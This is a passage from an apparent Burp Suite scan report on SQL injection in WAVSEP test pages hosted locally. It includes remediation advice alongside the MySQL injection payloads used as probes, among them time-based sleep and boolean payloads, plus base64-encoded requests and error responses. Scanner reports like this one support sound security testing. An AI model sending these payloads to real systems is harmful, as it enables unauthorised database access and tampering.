ponse>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7761601930679576576</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>80866682 or 3168=03168</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTEzLUluamVjdGlvbkluQ2FsYy1EYXRlLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTM3DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjE4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCkV4Y2VwdGlvbiBkZXRhaWxzOiBqYXZhLnNxbC5TUUxTeW50YXhFcnJvckV4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnJzIwMTAtMDEtMDEnJycgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTEzLUluamVjdGlvbkluQ2FsYy1EYXRlLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjE4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClNldmVyYWwgYWNjb3VudHMgbWF0Y2ggdGhlIGNyaXRlcmlhLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTEzLUluamVjdGlvbkluQ2FsYy1EYXRlLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxODA4NjY2ODIlMjBvciUyMDMxNjglM2QwMzE2OCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNDIzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCkV4Y2VwdGlvbiBkZXRhaWxzOiBqYXZhLnNxbC5TUUxFeGNlcHRpb246IEluY29ycmVjdCBEQVRFIHZhbHVlOiAnMjAxMC0wMS0wMTgwODY2NjgyIG9yIDMxNjg9MDMxNjgnCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTEzLUluamVjdGlvbkluQ2FsYy1EYXRlLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzQNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCk5vIE1hdGNoLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5657088268237964288</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the transactionDate parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoMjAwRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTMzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjIxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICcnMjAxMC0wMi0wMicnJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoMjAwRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMicnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjIxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKUXVlcnkgZXhlY3V0ZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
